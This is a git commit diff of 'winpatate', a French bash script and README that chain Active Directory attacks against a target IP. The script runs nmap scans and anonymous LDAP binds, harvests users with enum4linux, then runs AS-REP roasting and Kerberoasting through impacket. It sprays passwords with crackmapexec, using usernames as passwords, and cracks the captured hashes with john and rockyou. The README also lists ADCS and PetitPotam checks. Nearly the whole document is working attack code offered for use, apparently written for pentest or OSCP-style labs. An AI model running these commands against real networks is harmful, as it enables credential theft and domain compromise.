bf201ea6ad58511476d1c180206c7bf6a68df7bb
dirbuster <pralainleopold@gmail.com>
2023-01-07 19:07:14 +0100

    win v2

--- README.md
+++ README.md
@@ -1,2 +1,29 @@
 # winpatate
-bash script for full windows enumeration
+
+Wincheck.sh est un script bash qui rassemble l'execution de plusieurs commandes d'ennumération au sein d'un actiove directory
+
+## Installation
+
+```bash
+git clone  https://github.com/leo9722/winpatate.git
+cd winpatate 
+chmod +x wincheck.sh && chmod +x install.sh 
+./install.sh
+./install wincheck.sh
+```
+
+## Utilisation
+
+Il suffit juste de fournir l'ip de la taget et le script se chargera de recupérer le domaine associé et ainsi d'y effectuer diverses attaques.
+
+Parmis celles-ci :
+
+- full nmap (-sS -sU -p- )
+- anonymous bind ldap search 
+- enum4linux ( get potential users)
+- ASP_REQ_ROAST attack ( si users trouvé)
+- Password Spraying ( si users trouvé )
+- Kerberoasting ( si user trouvé )
+- crack de mdp ( si creds trouvé )
+- check vuln adcs
+- petitpotam module 
--- wincheck.sh
+++ wincheck.sh
@@ -22,22 +22,36 @@ echo -e "${RED}                          ░                       ░          
 echo -e "${BOLDGREEN} ~ Personnal script for checking activedirectory vulnérabilities  ~${ENDCOLOR}"
 echo  -n -e "${BOLDGREEN} ~ Enter ip adress : ${ENDCOLOR}"&read ip
 
-# New part to check SNMP ( OSCP )
-# TODO --> check version of SNMP and test 
-out_nmap=$(sudo nmap -sS -sU -p- $ip > out_map)
 
-check_snmp=$( cat out_map | grep 161 )
-if [ "$check_snmp" ];then
-	echo "Potential listing Users [ ... ]"
-	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
-	if [ -n $snmpwalk ];then
-		echo $snmp_user > snmp_users.txt
-	fi
-	echo "Potential enum for process [ ... ]"
-	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+echo  -n -e "${BOLDGREEN} ~ 1- full nmap scan  |  2- basic nmap scan   : ${ENDCOLOR}"&read scan 
+
+if [ "$scan" == 1 ]; then
+	mkdir nmap 
+	out_nmap=$(sudo nmap -PN -sC -sV -p- -sU $ip > full_nmap)
+	mv full_nmap nmap
+elif [ "$scan" == 2 ]; then
+	mkdir nmap 
+	out_nmap=$(sudo nmap -sV -A -sC -Pn $ip > basic_nmap)
+	mv basic_nmap nmap
+else
+	echo -e "${RED} please select 1 or 2 for scan ${ENDCOLOR}"
 fi
 
+# Uncomment if you want to check snmp
+
+# check_snmp=$( cat out_map | grep 161 )
+# if [ "$check_snmp" ];then
+# 	echo "Potential listing Users [ ... ]"
+# 	snmp_user=$(snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25)
+# 	if [ -n $snmpwalk ];then
+# 		echo $snmp_user > snmp_users.txt
+# 	fi
+# 	echo "Potential enum for process [ ... ]"
+# 	snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2
+# fi
+
 ## Check for domain part with CME / possibility switch with dnsrecon
+
 domain=$(crackmapexec smb $ip | cut -d: -f3 | cut -d\) -f1   )
 if [ "$domain" ];then
 	echo -e "${GREEN}[+] Domain found  --> $domain ${ENDCOLOR}"
@@ -59,65 +73,59 @@ if [ "$bind_verif" = "success" ];then
 		echo -e "${RED}[-] No succes to bind ldap anonymous  ${ENDCOLOR}"
 fi
 
-# Enum4Linux to check RPC enum for discovering some User's 
+# Enum4Linux to check RPC enum for discovering some User's
+
 enum4linux $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 > users.txt 
+#enum4linux -a -u"" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
+#enum4linux -a -u"guest" -p"" $ip |grep user: | cut -d' ' -f1 | cut -d'[' -f2 | cut -d']' -f1 >> users.txt 
+crackmapexec smb $ip --users
 
 check_users=$(cat users.txt)
 
-# If users found try forst attack ASP_RES_ROAST 
+ 
 if [ -n "$check_users" ];then
 	echo -e "${GREEN}[+] Users Found with Eum4linux, trying ASP_REQ_ATTACK${ENDCOLOR}"
 
 	#ASP_REQ_ROAST_CHECK 
-	python3 /opt/tools/windows/impacket/examples/GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
+	impacket-GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
 	confirm=$(ls | grep hash.asproast)
 	if [ "$confirm" = "hash.asproast" ];then
 		echo -e "${GREEN}[+] ASP_REQ_ATTACK Found ... be patient john is cracking the hash  of the user services ${ENDCOLOR}"
 		john hash.asproast --wordlist=/usr/share/wordlists/rockyou.txt
+	else
+		echo -e "${RED}[-] No succes to ASP_REQ_ATTACK  ${ENDCOLOR}"
 	fi 
 
 	## Try password spraying 
+	echo -e "${GREEN}[+] Users Found with Eum4linux, trying Password SPRAYING ATTACK${ENDCOLOR}"
 	passspray=$(crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes | grep -E -i + | cut -d: -f1)
-	if [ -n $snmp_user ];then
-		snmp_passspray=$(crackmapexec smb $ip -u snmp_users.txt -p snmp_users.txt --no-bruteforce --continue-on-succes | grep -E -i + | cut -d: -f1)
-		## Kerberoast attack
-		if [ -n "$snmp_passspray" ];then
-			echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"
 
-			echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK  ... ${ENDCOLOR}"
-
-			python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -request -dc-ip $ip $domain/$snmp_passspray  -outputfile hashes.kerberoast 
-			check_snmp_kerberoast=$(ls hashes.kerberoast)
-			if [ -n "$check_snmp_kerberoast" ]; then
-				echo -e "${GREEN}[+] User $snmp_passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
-				john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
-			fi
-	fi
 	## Kerberoast attack
-
 	if [ -n "$passspray" ];then
 		echo -e "${GREEN}[+] Success on password spraying attack with the user $passspray ${ENDCOLOR}"
 
 		echo -e "${BOLDGREEN} TRYING KERBEROAST ATTACK  ... ${ENDCOLOR}"
 
-		python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
+		impacket-GetUserSPNs.py  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
 		check_kerberoast=$(ls hashes.kerberoast)
 		if [ -n "$check_kerberoast" ]; then
-			echo -e "${GREEN}[+] User $passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
-			john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
+				echo -e "${GREEN}[+] User $passspray is kerboastable - trying to crack his password ...${ENDCOLOR}"
+				john john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
+		else
+			echo -e "${RED}[-] No succes to KERBEROAST  ${ENDCOLOR}"
 		fi
-
-	else 
-		echo -e "${RED}[-] No found users kerboastable ${ENDCOLOR}"
-		# Users as pass attack 
-		crackmapexec smb $ip -u users.txt -p users.txt -M adcs
-		crackmapexec winrm $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes
+	else
+		echo -e "${RED}[-] No succes to Password SPRAYING ATTACK  ${ENDCOLOR}"
 	fi
+
+	# Users as pass attack 
+	echo -e "${GREEN}[+] Trying Password SPRAYING ATTACK on Another services${ENDCOLOR}"
+	crackmapexec smb $ip -u users.txt -p users.txt -M adcs
+	crackmapexec winrm $ip -u users.txt -p users.txt --no-bruteforce --continue-on-succes
 
 else 
 	echo -e "${RED}[-] No users found ${ENDCOLOR}"
-	rm users.txt 
-	rm out_map
+	rm users.txt
 fi
 
 
